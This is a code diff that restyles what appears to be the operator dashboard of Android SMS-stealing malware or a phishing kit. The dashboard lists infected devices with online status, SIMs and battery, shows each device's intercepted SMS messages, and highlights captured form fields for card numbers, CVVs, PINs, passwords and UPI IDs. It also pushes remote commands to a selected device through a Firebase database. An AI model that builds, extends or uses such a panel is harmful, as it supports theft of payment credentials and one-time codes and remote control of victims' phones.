+                                <div class="w-3 h-3 rounded-full ${isOnline ? 'online-dot bg-green-500' : 'bg-slate-300'}"></div>
+                                <div>
+                                    <div class="font-black text-slate-800 uppercase text-sm leading-none">${name}</div>
+                                    <div class="text-[10px] text-slate-400 mt-1 uppercase font-bold">LAST: ${formatTime(info.lo)}</div>
+                                </div>
                             </div>
-                        </td>
-                        <td class="px-3 py-3">
-                            <div class="text-[8px] font-black text-slate-600">S1: ${sims[0]?.n || 'H'}</div>
-                            <div class="text-[8px] text-slate-400 font-bold">S2: ${sims[1]?.n || 'H'}</div>
-                        </td>
-                        <td class="px-3 py-3 min-w-[140px] max-w-[250px]">
-                            <div class="flex items-center gap-1.5 mb-0.5"><span class="text-[8px] font-black text-blue-600 uppercase truncate">${lastM.s || 'WAITING'}</span></div>
-                            <div class="text-[9px] text-slate-500 italic break-words line-clamp-2">"${lastM.m || 'PENDING...'}"</div>
-                        </td>
-                        <td class="px-3 py-3 text-right"><button class="bg-slate-900 text-white px-3 py-1 rounded text-[8px] font-black uppercase">OPEN</button></td>
+                            <button class="bg-slate-900 text-white px-4 py-1.5 rounded-lg text-[10px] font-black uppercase">OPEN</button>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-2 mb-3 bg-slate-50 p-2 rounded-lg border border-slate-100">
+                            <div><div class="text-[9px] text-slate-400 font-bold uppercase">SIM 1</div><div class="text-xs font-black text-slate-700">${sims[0]?.n || 'H'}</div></div>
+                            <div><div class="text-[9px] text-slate-400 font-bold uppercase">SIM 2</div><div class="text-xs font-black text-slate-700">${sims[1]?.n || 'H'}</div></div>
+                        </div>
+
+                        <div class="bg-blue-50/50 border border-blue-100 p-3 rounded-xl">
+                            <div class="flex items-center gap-2 mb-1">
+                                <i class="fas fa-comment-dots text-blue-400 text-[10px]"></i>
+                                <span class="text-[10px] font-black text-blue-600 uppercase truncate">${lastM.s || 'WAITING'}</span>
+                            </div>
+                            <div class="text-sm font-bold text-slate-600 leading-tight">"${lastM.m || 'PENDING...'}"</div>
+                        </div>
                     `;
-                    tbody.appendChild(tr);
+                    listDiv.appendChild(card);
                 }
             });
         }
@@ -483,14 +504,14 @@
         document.getElementById('det-id').innerText = `ID: ${uid} | S1: ${sims[0]?.n || 'H'} | S2: ${sims[1]?.n || 'H'}`;
         document.getElementById('det-model').innerText = `${info.mf || 'NA'} | V:${info.v || 'NA'}`;
         document.getElementById('det-bat').innerText = `${info.bl || 0}%`;
-        document.getElementById('det-online-dot').className = `w-2 h-2 rounded-full ${isOnline ? 'bg-green-500 online-dot' : 'bg-slate-300'}`;
+        document.getElementById('det-online-dot').className = `w-2.5 h-2.5 rounded-full ${isOnline ? 'bg-green-500 online-dot' : 'bg-slate-300'}`;
 
         const smsDiv = document.getElementById('det-sms-logs');
         smsDiv.innerHTML = '';
         Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach(m => {
             const div = document.createElement('div');
-            div.className = "bg-slate-50 p-2.5 rounded-lg border border-slate-100";
-            div.innerHTML = `<div class="flex justify-between items-center mb-1"><div class="flex items-center gap-2"><span class="text-[8px] font-black text-blue-600">${m.s}</span>${m.ss ? `<span class="bg-blue-100 text-blue-700 px-1 rounded text-[6px] font-black">S${m.ss}</span>` : ''}</div><span class="text-[7px] text-slate-400">${new Date(m.ts).toLocaleTimeString()}</span></div><div class="text-[10px] font-bold text-slate-800 leading-tight">${m.m}</div>`;
+            div.className = "bg-slate-50 p-3 rounded-xl border border-slate-100";
+            div.innerHTML = `<div class="flex justify-between items-center mb-1.5"><div class="flex items-center gap-2"><span class="text-xs font-black text-blue-600">${m.s}</span>${m.ss ? `<span class="bg-blue-100 text-blue-700 px-1.5 rounded text-[10px] font-black">S${m.ss}</span>` : ''}</div><span class="text-[10px] text-slate-400 font-medium">${new Date(m.ts).toLocaleTimeString()}</span></div><div class="text-sm font-bold text-slate-800 leading-tight">${m.m}</div>`;
             smsDiv.appendChild(div);
         });
 
@@ -498,10 +519,14 @@
         formDiv.innerHTML = '';
         Object.values(u.F || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach((f, idx) => {
             const wrap = document.createElement('div');
-            wrap.className = "bg-white border-l-4 border-l-rose-600 p-3 shadow-sm rounded-xl";
-            wrap.innerHTML = `<div class="text-[8px] font-black text-rose-600 uppercase mb-2">ENTRY #${idx+1} <span class="text-slate-400 ml-2 font-mono text-[7px]">${new Date(f.ts).toLocaleString()}</span></div>`;
-            let grid = `<div class="grid grid-cols-2 gap-2">`;
-            for(let k in f) { if(['ts','uid','name'].includes(k)) continue; const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase()); grid += `<div class="bg-slate-50 p-1.5 rounded-lg"><div class="text-[7px] text-slate-400 uppercase font-black">${k}</div><div class="text-[9px] font-black ${isS ? 'text-rose-600' : 'text-slate-900'} truncate">${f[k]}</div></div>`; }
+            wrap.className = "bg-white border-l-4 border-l-rose-600 p-4 shadow-sm rounded-xl";
+            wrap.innerHTML = `<div class="text-xs font-black text-rose-600 uppercase mb-3">ENTRY #${idx+1} <span class="text-slate-400 ml-2 font-mono text-[10px]">${new Date(f.ts).toLocaleString()}</span></div>`;
+            let grid = `<div class="grid grid-cols-1 gap-3">`;
+            for(let k in f) {
+                if(['ts','uid','name'].includes(k)) continue;
+                const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase());
+                grid += `<div class="bg-slate-50 p-2.5 rounded-lg border border-slate-100"><div class="text-[10px] text-slate-400 uppercase font-black mb-0.5">${k}</div><div class="text-sm font-black ${isS ? 'text-rose-600' : 'text-slate-900'}">${f[k]}</div></div>`;
+            }
             grid += `</div>`;
             wrap.innerHTML += grid;
             formDiv.appendChild(wrap);
@@ -551,8 +576,8 @@
         }
         db.ref(`Users/${selectedUid}/C`).push(cmd);
         const st = document.getElementById('cmd-status');
-        st.innerText = "SENT ✓"; st.className = "text-[8px] font-black bg-green-600 px-2 py-0.5 rounded text-white";
-        setTimeout(() => { st.innerText = "READY"; st.className = "text-[8px] font-black bg-slate-800 px-2 py-0.5 rounded text-slate-400"; }, 2000);
+        st.innerText = "SENT ✓"; st.className = "text-[10px] font-black bg-green-600 px-3 py-1 rounded text-white";
+        setTimeout(() => { st.innerText = "READY"; st.className = "text-[10px] font-black bg-slate-800 px-3 py-1 rounded text-slate-400"; }, 2000);
     }
 
     function saveGlobal(k) {
